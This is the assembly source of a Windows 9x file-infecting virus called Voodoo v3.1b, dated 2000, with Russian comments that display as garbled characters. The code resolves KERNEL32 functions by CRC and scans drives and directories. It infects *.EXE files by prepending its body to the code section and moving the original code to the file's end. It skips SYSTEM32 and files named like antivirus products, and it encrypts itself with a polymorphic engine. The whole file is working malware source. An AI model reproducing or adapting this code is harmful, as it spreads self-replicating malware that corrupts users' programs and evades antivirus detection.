   ; *¥à¥¤ ¢ ¬¨ ª«® ¬®¥£® ’‚€*…¨ï win32.voodoo v3.1 .
   ; ’¥¯¥àì ® áâ « ¯®«¨¬®àäë¬. *à ¢¤ , ¯à¨è«®áì ¯®¦¥àâ¢®¢ âì â¨âã«®¬ win32
   ; ¨ ¤®¢®«ìáâ¢®¢ âìáï win9X. *â® ®¡ãá«®¢«¥® ¬®¨¬ ¯®«¨¬®àäë¬ à áè¨äà®¢é¨ª®¬
   ; ¨«¨ ¬®¨¬ ¬¥â®¤®¬ § à ¦¥¨ï. ‚ ®¡é¥¬, ¯®¤ ®â« ¤ç¨ª®¬ ¢ NT ª®¤ à ¡®â ¥â â ª
   ; ª ª ï § ¤ã¬ «,   § ¯ãáª ¥èì â ª, ¢ëáª ª¨¢ ¥â dr.Watson. ˆ§ ¤ ¬¯  à¥£¨áâà®¢
   ; ¢¨¤®, çâ® ® (à áè¨äà®¢é¨ª) ®âà ¡®â «, ® ª®¤ ®áâ ¥âáï § è¨äà®¢ ë¬.
   ; ‘«¥¤ã¥â ®â¬¥â¨âì, çâ® íâ®â ¡ £ ¬®¦® ¨á¯®«ì§®¢ âì ª ª  â¨ - ®â« ¤ªã.
   ; ‚ ®â« ¤ç¨ª¥ ª®¤ ¡ã¤¥â ªà¨¯â®¢ âìáï,   ¡¥§ ®â« ¤ç¨ª  ª®¤ ¡ã¤¥â
   ; à ¡®â âì (â®«ìª® ¤«ï NT).
   ; „¥áâàãªæ¨© ¥ ¥á¥â ( ¯®ªà ©¥© ¬¥à¥ ï¢ëå ;) ).
   ; *ª®¤®¢ ï á¥ªæ¨ï - ®¡ê¥ªâ PE ä ©«  á  âà¨¡ãâ ¬¨ EXEC+READ+write
   ;ŠŽŒ*ˆ‹Ÿ–ˆŸ:
   ;*®á«¥ â®£® ª ª á¤¥«  EXE ¥£®  ¤® ¯à®¯ âç¨âì ¨á¯®«ì§ãï ¯à®£ã setwrite.exe,
   ;¯à®áâ ¢¨âì  âà¨¡ãâ WRITE   ª®¤®¢ãî á¥ªæ¨î. *®á«¥ íâ®£® ® £®â®¢ ª ã¯®âà¥¡«¥¨î ;)
   ; ============================ Win9x.Voodoo_v3.1b ===========================
   ; Program       : Voodoo v3.1b
   ; Description   : Parasitic, poly crypt PE virus
   ; Last modified : 21.04.2000
   ; Target OS     : Win95/98
   ; Notes         :
   ImBase equ 00400000h
   Entyp  equ 00001000h
   ADDC   equ ImBase+Entyp+5
   DiskCount EqU 5
   FileCount EqU 5
   SYSTEM32CRC EQU 04C6D9398h
   .386p
   .model flat
   VirSize EQU offset Voodoo_Ver_3_0Ep - offset Voodoo_Ver_3_1p
   EQSIZE2CRYPT        EQU VirSize
   MemSize             Equ 2300h
   MemSize2DINA        EQU 1000h
   extrn   ExitProcess:PROC
   include win32con.inc ; ®¯¨á ¨¥ consts
   include register.inc
   include macro.inc
   ;---------------------------
   .DATA
   dd VirSize
   db 0
   flag dd 12345678h
   CheckSum        EQU 0B0966F54h
   CheckSum2       EQU 05E5F512Fh
   _GlobalUnlock       EQU  0
   _GlobalFree         EQU _GlobalUnlock+4
   _CreateFileA        EQU _GlobalFree+4
   _CreateFileMappingA EQU _CreateFileA+4
   _MapViewOfFile      EQU _CreateFileMappingA+4
   _UnmapViewOfFile    EQU _MapViewOfFile+4
   _FlushViewOfFile    EQU _UnmapViewOfFile+4
   _CloseHandle        EQU _FlushViewOfFile+4
   _FindFirstFileA     EQU _CloseHandle+4
   _FindNextFileA      EQU _FindFirstFileA+4
   _SetFileAttributesA EQU _FindNextFileA+4
   _SetFileTime        EQU _SetFileAttributesA+4
   _GetFileSize        EQU _SetFileTime+4
   _GetCommandLineA    EQU _GetFileSize+4
   _ReadFile           EQU _GetCommandLineA+4
   _lstrcpyA           EQU _ReadFile+4
   _SetFilePointer     EQU _lstrcpyA+4
   _GetCurrentDirectory EQU _SetFilePointer+4
   _SetCurrentDirectory EQU _GetCurrentDirectory+4
   _GetSystemTime      EQU _SetCurrentDirectory+4
   OldEBP              EQU _GetSystemTime+4
   FileSize            EQU OldEBP+4
   lpVirSizePolyOld    EQU  FileSize+4
   lpVirSizePolyNew    EQU lpVirSizePolyOld+4
   hMemBufferForDINA   EQU lpVirSizePolyNew+4
   MemBufferForDINA    EQU hMemBufferForDINA+4
   MemBufferForCrypt   EQU MemBufferForDINA+4
   HhendleOfFile       EQU MemBufferForCrypt+4
   HhendleOfMapFile    EQU HhendleOfFile+4
   CurEDI              EQU HhendleOfMapFile+4
   Pointer2MapFile     EQU CurEDI+4
   tag                 EQU Pointer2MapFile+4
   SearcHandle         EQU tag+2
   SearcHandle2        EQU SearcHandle+4
   systemtime          EQU SearcHandle2+4
   CODEBUF             EQU systemtime +16
   CommandLine         EQU CODEBUF+VirSize
   CurDir              EQU CommandLine+800
   CurDir2             EQU CurDir+800
   Win32FindData       EQU CurDir2 +800
      CreationTime        EQU Win32FindData+4
      LastAccessTime      EQU CreationTime+4
      LastWriteTime       EQU LastAccessTime+4
      files               EQU LastWriteTime+32

   NumberOfBytesRead   EQU MemSize-4
   @Name_Pointers_RVA EQU offset Name_Pointers_RVA - offset EntryPoint_
   @GetProcAddress    EQU offset GetProcAddress - offset EntryPoint_
   @KernelHandle      EQU offset KernelHandle   - offset EntryPoint_
   @_GlobalAlloc      EQU offset _GlobalAlloc  - offset EntryPoint_
   @_GlobalLock       EQU offset _GlobalLock  - offset EntryPoint_
   @lpVirSizePoly     EQU offset VirSizePoly   - offset EntryPoint_
   @MemPointer        EQU offset MemPointer  - offset EntryPoint_
   @NextCode          EQU offset NextCode  - offset EntryPoint_
   @Dirmask           EQU offset Dirmask - offset EntryPoint_
   @mask              EQU offset _mask - offset EntryPoint_
   @disk              EQU offset disk - offset EntryPoint_
   @EntryPointRVA     EQU offset EntryPointRVA - offset EntryPoint_
   @ImportTable       EQU offset ImportTable - offset EntryPoint_
   @EndImportTable    EQU offset EndImportTable - offset EntryPoint_
   .CODE
   Voodoo_Ver_3_1p:
   ;-------------------------------------------------------
      Call EntryPoint_
   EntryPoint_:
   ;find MZ in memory
   ;----------------------
    call _ESI
   _ESI: pop esi
         pop ecx
     call  ScanMZ
      ; in esi PE header
      add esi,80h
      add edi,dword ptr [esi]     ;Import RVA
      jmp_ @L1
   ; * §¬¥à ª®¤  á ãç¥â®¬ ¯®«¨¬-£® ¤¥ªà¨¯â®à .
   offset2VirSizePoly EQU offset VirSizePoly-offset Voodoo_Ver_3_1p
   VirSizePoly dd 12345678h
   NotKERNEL32:
       MOV EBX,EBP
       add edi,00014h
   @L1:
      cmp dword ptr [edi+0ch],000000h
      je NOtFound
      add ebx,dword ptr [edi+0ch] ;RVA NAme  of dll
      call CRCSum
      cmp eax,CheckSum
      jne NotKERNEL32
      push ebp
      pop esi
      add ESI,DWORD ptr [edi+10h] ;KERNEL32 proc
      mov esi,dword ptr [esi]
      cmp byte ptr [esi+5],0e9h   ; win98
      jne_ Ok_
      add esi,dword ptr [esi+6]
   Ok_:call ScanMZ
      ;push EBP ;Hendle of KERNEL32.dll
      add esi,78h
      add edi,dword ptr [esi]     ; edi=Export Directory Table RVA
      mov eax,ebp
      add eax,dword ptr [edi+1ch]    ; Address Table
      push eax
      mov edx,ebp
      add edx,dword ptr [edi+24h]    ; Ordinal Table
      add ebx,dword ptr [edi+20h] ;ebx=Name Pointers RVA
      mov dword ptr [ecx+@Name_Pointers_RVA],ebx
      mov esi,ebx
      push ecx
      mov ecx,dword ptr [edi+18h] ; Num of Name Pointers
      push ecx
   @L2:call ScanNameTable
       cmp eax,CheckSum2
       je_ FoundGetProcAdr
       inc esi
       inc esi
       inc esi
       inc esi
       loop @L2
   FoundGetProcAdr:
       pop eax
       sub eax,ecx ; #function
       shl eax,1   ; x2
       ; Ordinal Table
       add edx,eax ;
       xor eax,eax
       mov ax,word ptr [edx] ;Ordinal of GetProcAddress
       shl eax,2   ;x4
       pop ecx  ;entry
       pop ebx  ; offset to Address Table
       add ebx,eax
       mov eax,dword ptr [ebx]
       add eax,ebp
       mov [@GetProcAddress+ecx],eax
       mov [@KernelHandle+ecx],ebp
       mov edx,zGlobalAlloc
       call  CalkProcAdress
       mov [@_GlobalAlloc+ecx],eax
       mov edx,zGlobalLock
       call  CalkProcAdress
       mov [@_GlobalLock+ecx],eax
       push ecx
       push MemSize
       push 0
       call dword ptr [@_GlobalAlloc+ecx]
       pop ecx
       push ecx
       push eax
       call dword ptr [@_GlobalLock+ecx]
       pop ecx
       mov [@MemPointer+ecx],eax
       mov eBX,eax
       mov edi,eax
       ;‚ë¤¥«ï¥¬ ¯ ¬ïâì ¤«ï ¤¥ªà¨¯â®à 
       push ecx
       push MemSize2DINA
       push 0
       call dword ptr [@_GlobalAlloc+ecx]
       pop ecx
       mov [ebx+hMemBufferForDINA],eax
       push ecx
       push eax
       call dword ptr [@_GlobalLock+ecx]
       pop ecx
       mov [ebx+MemBufferForDINA],eax
   ;#############################################
       mov eax,[ecx+@lpVirSizePoly] ;
       mov [lpVirSizePolyOld+ebx],eax  ;
   ;#############################################
       mov esi,@ImportTable
       add esi,ecx
   MakeImport:
       mov edx,dword ptr [esi]
       call CalkProcAdress
       cld
       stosd
       inc esi
       inc esi
       inc esi
       inc esi
       cmp word ptr [esi],6666h
       jne_ MakeImport
       mov ebp,ecx  ; entry ! ‚å®¤ ¢  è ª®¤.
       ;--------------------
       call Infect
       ;--------------------
             mov esi,ebp
             sub esi,5
             mov edi,CODEBUF
             add edi,ebx     ;MemPointer
             cld
   ;################################################
   ;*¥à¥¥á¥¬ â®«ìª® ç¨áâë© ª®¤
             mov ecx,VirSize
   ;################################################
             rep movsb
   NOtFound:
             cmp  [flag],12345678h
             jne_ Ret2Prog
             push 0
             call ExitProcess
   Ret2Prog:   mov [OldEBP+ebx],ebp
               mov esi,ebx
               mov ebp,esi
               add esi,@NextCode+CODEBUF+5
               add ebp,CODEBUF+5
               jmp esi
   ; *¥à¥á¥«ï¥¬áï ¢ ¢ë¤¥«¥ãî ¯ ¬ïâì
   NextCode:
             call    GetCommandLineA
             mov esi,eax
             cmp byte ptr [esi+1],':' ;for win9x
             je_ NormalCommandLine
             inc eax
   NormalCommandLine:
           push    eax
           mov eax,CommandLine
           add eax,ebx
           push eax
           call    lstrcpyA
           mov esi,CommandLine
           add esi,ebx
           push esi
   @L3:     inc esi
            cmp byte ptr [esi],'.'
            jne_ @L3
            pop eax
            push NULL
            push FILE_ATTRIBUTE_ARCHIVE
            push OPEN_EXISTING
            push NULL
            push FILE_SHARE_READ ;or FILE_SHARE_WRITE
            push GENERIC_READ ;or GENERIC_WRITE
            push eax
            call CreateFileA
            mov [HhendleOfFile+ebx],eax
            push eax
            push NULL
            push eax
            call GetFileSize
            mov edx,eax
   ;################################################
            sub edx,dword ptr [lpVirSizePolyOld+ebx]
            dec edx ; -1 ¡ ©â
   ;################################################
             pop eax
             push eax
             push 0
             push NULL
             push edx
             push eax
             call SetFilePointer
             pop eax
              mov edx,[ebx+OldEBP]
              sub edx,5
              sub edx,dword ptr [lpVirSizePolyOld+Ebx] ; -(VirSizePolyOld-VirSize)
              add edx,VirSize                          ;
              push edx
              push NULL
              mov ecx,NumberOfBytesRead
              add ecx,ebx
              push ecx
   ;################################################
              push dword ptr [lpVirSizePolyOld+Ebx]
              inc  dword ptr ss:[esp] ; +1 ¡ ©â
   ;################################################
              push edx
              push eax
              call ReadFile
              pop esi
              call _EDI
   EntryPointRVA: dd 0
   _EDI:          pop edi
                  add esi,dword ptr [edi]
                  jmp esi
   ; Žâ¤ ¥¬ ã¯à ¢«¥¨¥ ¦¥àâ¢¥
   ;----------------------------------------------------------
   PushWin32FindData:
           mov edx,Win32FindData
           add edx,ebx
           ret
   InfectDir:
           mov eax,CurDir2
           add eax,ebx
           push eax        ;
           push  800
           call GetCurrentDirectory
           call Infect_All_files
           call PushWin32FindData
           push edx
           mov eax,ebp
           add eax,@Dirmask
           push eax
           call  FindFirstFileA
           inc eax
           jz ExitFromProcInfectDir
           dec eax
           mov  dword ptr [SearcHandle+ebx],eax
    l2:    call PushWin32FindData
           push edx
           push    dword ptr [SearcHandle+ebx]
           call    FindNextFileA
           or eax,eax
           je_ ExitFromProcInfectDir
           cmp byte ptr [files+ebx],'.'
           je_  l2
           mov eax,[Win32FindData+ebx]
           and eax,FILE_ATTRIBUTE_DIRECTORY
           je_ l2
           ;set new dir
           mov edx,CurDir2
           add edx,ebx
           push edx
           call SetCurrentDirectory
           mov edx,files
           add edx,ebx
           ; SYSTEM32 ?
           push ebx
           mov ebx,edx
           call  CRCSum
           pop ebx
           cmp eax,SYSTEM32CRC
           je_  l2 ;DoNotInfect
           push edx
           call SetCurrentDirectory
           call Infect_All_files
           jmp l2
   ExitFromProcInfectDir:
           ret
   ;----------------------------------------------------------
   Infect_All_files:
           call PushWin32FindData
           push edx
           mov edx,@mask
           add edx,ebp
           push edx
           xor ecx,ecx
           call    FindFirstFileA
           mov  dword ptr [SearcHandle2+ebx],eax
           cmp     eax,-1
           je_     l2__
   Next:    or eax,eax
            je_  l2__
           cmp ecx,FileCount
           jnl_  l2__
           inc  ecx
           push ecx
           call InfectFile
           call PushWin32FindData
           push edx
           push    dword ptr [SearcHandle2+ebx]
           call    FindNextFileA
           pop ecx
           cmp di,9999h
           jne_ Noerrror
           dec ecx
           xor edi,edi
   Noerrror:
           jmp    Next
   l2__:    ret
   ;-----------------------------------------------------------
   Infect:
           mov eax,CurDir
           add eax,ebx
           push eax        ;
           push  800
           call GetCurrentDirectory
           call InfectDir
           mov ecx,DiskCount
   Scan:   push ecx
           mov eax,@disk
           add eax,ebp
           push eax
           call SetCurrentDirectory
           call InfectDir
           inc byte ptr [@disk+ebp]
           pop ecx
           loop Scan
           mov eax,CurDir
           add eax,ebx
           push eax        ;
           call SetCurrentDirectory
           ret
   ;----------------------------------------------------------
   InfectFile:
            ; *à®¢¥àª     â¨¢¨àãáë
            mov eax,ebx
            add eax,files
            cmp word ptr [eax],'-F'   ;F-port
            je  @AV
            cmp word ptr [eax],'WA'   ; AW ?
            je  @AV
            cmp word ptr [eax],'VA'   ; AV?????
            je  @AV
            cmp word ptr [eax+1],'VA' ;NAV,PAV,RAV,_AVP???
            je  @AV
            cmp word ptr [eax+3],'BE' ;drWeb
            je  @AV
            cmp word ptr [eax+2],'DN' ;PANDA
            je  @AV
            cmp dword ptr [eax],'ITNA';ANTI???
            je  @AV
            cmp dword ptr [eax],'FASV';VSAF???
            je  @AV
            cmp dword ptr [eax],'PWSV';VSWP???
            je  @AV
            cmp dword ptr [eax],'VASF';FSAV???
            je  @AV
            push eax
            push 00000020h
            push eax
            call SetFileAttributesA
            pop eax
            push NULL
            push FILE_ATTRIBUTE_ARCHIVE
            push OPEN_EXISTING
            push NULL
            push  FILE_SHARE_READ or FILE_SHARE_WRITE
            push GENERIC_READ or GENERIC_WRITE
            push eax
            call CreateFileA ; Žâªà®¥¬ ä ©«
            cmp eax,-1
            je Error__
            call LoadMemPointer
            mov [HhendleOfFile+ebx],eax
            push ebx
            push NULL
            push eax
            call GetFileSize
            pop ebx
            mov [FileSize+ebx],eax ; ‡ ¯®¬¨¬ ¥£® à §¬¥à
   Point@ret:push edx
            push eax ; to MApViewofFile
            push NULL
            push eax
            push NULL
            push PAGE_READWRITE
            push NULL
            push dword ptr [HhendleOfFile+ebx]
            call CreateFileMappingA
            mov [HhendleOfMapFile+ebx],eax
            ; v steke Size
            push 0
            push 0
            push FILE_MAP_WRITE
            push eax
            call MapViewOfFile  ; ‡ ¬ ¯¨¬ ¥£®
            mov [Pointer2MapFile+ebx],eax
            pop edx
            cmp word ptr [tag+ebx],6666h ; *®¢â®à®¥ ¬ ¯¨à®¢ ¨¥
            je  OkOb
            mov esi,eax
            CMP byte ptr [esi+18h],40h
            jl OOO
            cmp dword ptr [esi+3ch],00010000h
            jg OOO
            mov edi,dword ptr [esi+3ch]
            cmp dword ptr [esi+edi],00004550h ;PE Only !
            jne  OOO
            cmp dword ptr [esi+6fh],334e4957h ;'WIN3'  Infected ?
            je  OOO
            ;find CODE object
            mov [systemtime+ebx],esi
            add esi,edi
            mov eax,dword ptr [esi+80h] ;Import Table RVA
            push eax
            xor ecx,ecx
            mov cx,word ptr [esi+6h] ;Num of Object
            MOV EDX,DWORD ptr [esi+28h] ; Entry point RVA
            mov dword ptr [ebp+@EntryPointRVA],edx
            mov edx,esi
            mov eax,24
            add ax,word ptr [esi+14h]
            mov edi,esi
            add edi,eax ;edi=Object Table
            pop eax ;Import Table RVA
            pusha
            mov edx,eax
   Find_Import_Table:
            dec ecx
            mov eax,dword ptr [edi+0ch] ; Object RVA
            cmp edx,eax
            jnl_ Mabe
   IncEDI:  add edi,28h
            or ecx,ecx
            je_ Not_Find
            jmp Find_Import_Table
   Mabe:    add eax,dword ptr [edi+10h] ; SIZE
            CMP EDX,EAX   ; Object RVA =< Import Table RVA =< Object RVA + Phisikal Size
            jle_ L22
            jmp_ IncEDI
            L22:
            mov esi,[Pointer2MapFile+ebx]
            push edx
            sub edx,dword ptr [edi+0ch]
            add esi,edx
            mov eax,dword ptr [edi+14h]   ;Phis  offset
            add esi,eax
            pop edx                       ; ESI = Phis offset Import Table
            mov ecx,dword ptr [edi+0ch]   ; Object RVA
   ECTLI_KERNEL:
            mov edi,dword ptr [esi+0ch]   ; EDI=Name RVA
            cmp edi,NULL ;
            je_ KERNEL_HET
            sub edi,ecx
            add edi,eax                   ; EAX= Phis offset
            add edi,[Pointer2MapFile+ebx]
            cmp dword ptr [edi],'NREK';KERNEL
            je_ KERNEL_ECT
            add esi,14h
            jmp ECTLI_KERNEL
   KERNEL_HET:                     ; ‘âà ®! Š¥à¥« ¥ ©¤¥.
   Not_Find:   popa
               jmp Code_Not_Find
   KERNEL_ECT: popa
   _loop:   db 08Bh,47h,24h ;mov eax,dword [edi+024h]
            EXEC_FLAG EQU 20000020h
            and eax,EXEC_FLAG
            jne_ Code_Object
            add edi,2ch
            loop _loop
            jmp Code_Not_Find
   Code_Object:
            ;chek object size
   ;###########################################################
             ;--------
             ;ƒ¥¥à¨àã¥¬ ¤¥ªà¨¯â®à
             pusha
             push ebx
             push EQSIZE2CRYPT+1   ;* §¬¥à ª®¤  ª â®àë© ã¦® § ªà¨¯â®¢ âì+1
             push DWORD PTR [ebx+MemBufferForDINA]
             call DINA
             pop  ebx
             mov [EBX+lpVirSizePolyNew],eax
             add dword ptr [EBX+lpVirSizePolyNew],VirSize
             popa
             ;--------
             ;* §¬¥à á¥ªæ¨¨ ¤®«¦¥ ¡ëâì ¡®«ìè¥  è¥£® ª®¤ 
             mov eax,dword ptr [EBX+lpVirSizePolyNew]
             cmp dword ptr [edi+10h],eax
             jl_ Code_Not_Find
   ;###########################################################
             push esi
             mov esi,dword ptr [systemtime+ebx]
             mov dword ptr [esi+6fh],334e4957h
             pop esi
             ; make writeble
             or dword ptr [edi+24h],80000000h
             mov eax,dword ptr [edi+0ch]            ;object RVA
             sub dword ptr [ebp+@EntryPointRVA],eax
             mov dword ptr [edx+28h],eax            ; Set New Entry Point RVA
             ; save old Programm
             call CloseMapping
             mov word ptr [ebx+tag],06666h
             mov eax,dword ptr [ebx+FileSize]
             push eax
   ;###########################################################
             add eax,dword ptr [EBX+lpVirSizePolyNew]
             inc eax  ; á¤¥« ¥¬ § ¯ á ¢ 1 ¡ ©â
   ;###########################################################
             jmp Point@ret
     OkOb:   mov word ptr [ebx+tag],09999h
             mov esi,dword ptr [edi+14h] ;phisical offset
             add esi,dword ptr [ebx+Pointer2MapFile]
             ;add esi,edx
             pop edi
             add edi,dword ptr [ebx+Pointer2MapFile]  ; edi=EOF
                                                      ; esi=ª®¤ ª â®àë© á«¥¤ã¥â á®åà ¨âì
   ;###########################################################
             mov ecx,dword ptr [EBX+lpVirSizePolyNew]
             inc ecx ; ãçâ¥¬ 1 ¡ ©â
   ;###########################################################
             push esi   ;offset of program CODE
                        ; ‘®åà ï¥¬ ¨áå®¤ë© ª®¤ ¯à®£à ¬¬ë
             cld        ; ¢ ª®æ¥ ¦¥àâ¢ë
             rep movsb  ;
   ;---------------------------------------------------------------------
   ; ‘¥©ç á âà¥¡ã¥âáï § è¨äà®¢ âìáï, ¨ ¯¥à¥§ ¯¨á âìáï.
           ;„«ï íâ®£® ¢ë¤¥«ï¥¬ ¥¬®£® ¯ ¬ïâ¨ >=VirSizePolyNew
           push dword ptr [EBX+lpVirSizePolyNew]
           push 0
           call dword ptr cs:[@_GlobalAlloc+ebp]
           push eax  ; ‘®åà ¨¬   ¢áïª¨© ...
           push eax
           call dword ptr cs:[@_GlobalLock+ebp]
           mov [ebx+MemBufferForCrypt],eax
           mov edi,eax
           xor eax,eax
           pusha
           call HAidEMKOHEc
   SetWhileNotExeption:             ; *®¨é¥¬ £¤¥  å®¤¨âáï ª®¥æ  è¥£®
           mov [ebx+CurEDI],edi
           cld                      ; ¡ãä¥à . Š®£¤  ¬ë ¥£®  ©¤¥¬ ¯à®¨§ ©¤¥â
           stosb                    ; ¨áª«îç¥¨¥.
           jmp_ SetWhileNotExeption  ;
   ;---------------------------------------------------------------------
   @HAidEMKOHEc:
            add dword ptr ss:[esp],offset HAidEMKOHEc-offset SetWhileNotExeption+2
            push dword ptr fs:[0]
            mov dword ptr fs:[0],esp
            jmp_ SetWhileNotExeption
   HAidEMKOHEc: JMP_ @HAidEMKOHEc
            mov  esp,[esp+8]
            pop eax ; ®ç¨áâª  áâ¥ª 
            pop eax ;
            popa
            mov edi,[ebx+CurEDI]
            sub edi,VirSize
            ;
             push edi
             mov esi,ebp       ; ‡ ¯¨è¥¬ ªà¨¯âã¥¬ë© ª®¤
             sub esi,5         ; ¢ á ¬ë© ª ¥æ RW ¯ ¬ïâ¨.
             mov ecx,VirSize   ;
             cld               ;
             rep movsb         ;
             pop edi
             mov ecx,dword ptr [EBX+lpVirSizePolyNew] ; „®¯¨è¥¬ ªà¨¯â®¢é¨ª
             mov [edi+offset2VirSizePoly],ecx         ; ‘®åà ¨¬ ¢ â¥«¥ ¯ â®¬ª 
             sub ecx,VirSize                          ; ¥£® à §¬¥à.
             sub edi,ecx                              ;
             mov esi,DWORD PTR [ebx+MemBufferForDINA] ;
             push edi
             cld                                      ;
             rep movsb                                ;
             pop edi
             pusha
             call  $+5
   Lb2:      add dword ptr ss:[esp],offset Lb1-offset Lb2
             push dword ptr fs:[0]
             mov dword ptr fs:[0],esp
             jmp edi

   Lb1:      nop
             nop
             mov  esp,[esp+8]
             pop eax ; ®ç¨áâª  áâ¥ª 
             pop eax ;
             popa
             pop eax
             pop esi
             push eax
             xchg esi,edi                    ;
             mov ecx,[EBX+lpVirSizePolyNew]  ; esi=offset of CryptCode
             cld                             ;
             rep movsb                       ;
             call GlobalUnlock
             ;-----------
   Code_Not_Find:
   OOO2:    call CloseMapping
   Error__2: call PushWin32FindData
            push dword ptr [edx]
            mov eax,ebx
            add eax,files
            push eax
            call SetFileAttributesA
   @AV:     ret
   OOO:      mov di,9999h
             jmp_  OOO2
   Error__:  mov di,9999h
             jmp_ Error__2
   ;--------------------------------------------------------
   CalkProcAdress:  push ecx
                    push esi
                    push edi
       mov esi,@Name_Pointers_RVA
       add esi,ecx
       mov esi,dword ptr [esi]
   fCRC: call ScanNameTable
       cmp  eax,edx
       je_  foCRC
       inc esi
       inc esi
       inc esi
       inc esi
       jmp_ fCRC
   foCRC:
     mov eax,dword ptr [esi]
     add eax,ebp
     push eax
     mov eax,@KernelHandle
     add eax,ecx
     push dword ptr [eax]
     call dword ptr [@GetProcAddress+ecx]
      pop edi
      pop esi
      pop ecx
      ret
   ;--------------------------------------------------------
   ScanNameTable:
       PUSH EBX
       push ecx
       mov ebx,ebp
       add ebx,dword ptr [esi]
       call CRCSum
       pop ecx
       POP EBX
       ret
   ;--------------------------------------------------------
   ScanMZ:
      push ecx   ;  \/
      and si,1111000000000000b
   ScanMZ_:
      sub esi,1000h
      cmp word ptr [esi],'ZM'
      jne_ ScanMZ_
      mov edi,esi
      mov ebx,esi
      MOV EBP,ESI
      push esi
      cmp dword ptr [esi+3ch],00010000h
      jg_  NextMZ
      add esi,dword ptr [esi+3ch]
      cmp dword ptr [esi],004550h
   NextMZ:pop esi
      jne_ ScanMZ_
      add esi,dword ptr [esi+3ch]
      pop ecx
      ret
   ;---Local ----------
   CloseMapping:
            push edx
            push dword ptr [Pointer2MapFile+ebx]
            call UnmapViewOfFile
            push dword ptr  [HhendleOfMapFile+ebx]
            call CloseHandle
            pop edx
            ret
   ;--------------------------------------------------------
   LoadMemPointer:
   mov ebx,dword ptr ds:[ebp+@MemPointer]
   ret
   ;----Import---------
   GlobalUnlock:call LoadMemPointer
                jmp dword ptr ds:[ebx+_GlobalUnlock]

   GlobalFree:  call LoadMemPointer
                jmp dword ptr ds:[ebx+_GlobalFree]

   GetFileSize: call LoadMemPointer
                jmp dword ptr ds:[ebx+_GetFileSize]
   CreateFileA: call LoadMemPointer
                jmp dword ptr ds:[ebx+_CreateFileA]
   CreateFileMappingA:
                call LoadMemPointer
                jmp dword ptr ds:[ebx+_CreateFileMappingA]
   MapViewOfFile:
                call LoadMemPointer
                jmp dword ptr ds:[ebx+_MapViewOfFile]
   UnmapViewOfFile:
              call LoadMemPointer
              jmp dword ptr ds:[ebx+_UnmapViewOfFile]
   FlushViewOfFile:
              call LoadMemPointer
              jmp dword ptr ds:[ebx+_FlushViewOfFile]
   CloseHandle: call LoadMemPointer
                jmp dword ptr ds:[ebx+_CloseHandle]
   GetCommandLineA:
                 call LoadMemPointer
                  jmp dword ptr ds:[ebx+_GetCommandLineA]
   lstrcpyA:   call LoadMemPointer
               jmp dword ptr ds:[ebx+_lstrcpyA]
   ReadFile:  call LoadMemPointer
              jmp dword ptr ds:[ebx+_ReadFile]
   SetFilePointer: call LoadMemPointer
                   jmp dword ptr ds:[ebx+_SetFilePointer]
   FindFirstFileA: call LoadMemPointer
                   jmp dword ptr ds:[ebx+_FindFirstFileA]
   FindNextFileA: call LoadMemPointer
                  jmp dword ptr ds:[ebx+_FindNextFileA]
   GetCurrentDirectory:
               call LoadMemPointer
               jmp dword ptr ds:[ebx+_GetCurrentDirectory]
   SetCurrentDirectory:
               call LoadMemPointer
               jmp dword ptr ds:[ebx+_SetCurrentDirectory]
   SetFileAttributesA:
               call LoadMemPointer
               jmp dword ptr ds:[ebx+_SetFileAttributesA]
   SetFileTime:
               call LoadMemPointer
               jmp dword ptr ds:[ebx+_SetFileTime]
   GetSystemTime:
               call LoadMemPointer
               jmp dword ptr ds:[ebx+_GetSystemTime]
   include dinav1.inc
   include CRC32API.inc
   db '(c) Voodoo/SMF v3.1b 10.03.2k'
   ;-------------------
   GetProcAddress    dd  11223344h
   KernelHandle      dd  11223344h
   Name_Pointers_RVA dd  11223344h
   _GlobalAlloc      dd  11223344h
   _GlobalLock       dd  11223344h
   MemPointer        dd  11223344h
   disk              db  'c:\',0
   Dirmask           DB  '*.*',0
   _mask             DB  '*.EXE',0
   ImportCount EQU (offset EndImportTable- offset ImportTable)/4
   ImportTable:      dd  zGlobalUnlock
                     dd  zGlobalFree
                     dd  zCreateFileA
                     dd  zCreateFileMappingA
                     dd  zMapViewOfFile
                     dd  zUnmapViewOfFile
                     dd  zFlushViewOfFile
                     dd  zCloseHandle
                     dd  zFindFirstFileA
                     dd  zFindNextFileA
                     dd  zSetFileAttributesA
                     dd  zSetFileTime
                     dd  zGetFileSize
                     dd  zGetCommandLineA
                     dd  zReadFile
                     dd  zlstrcpyA
                     dd  zSetFilePointer
                     dd  zGetCurrentDirectoryA
                     dd  zSetCurrentDirectoryA
                     dd  zGetSystemTime
                     dw  6666h
   EndImportTable:
   Voodoo_Ver_3_0Ep:
   Ends
   End Voodoo_Ver_3_1p
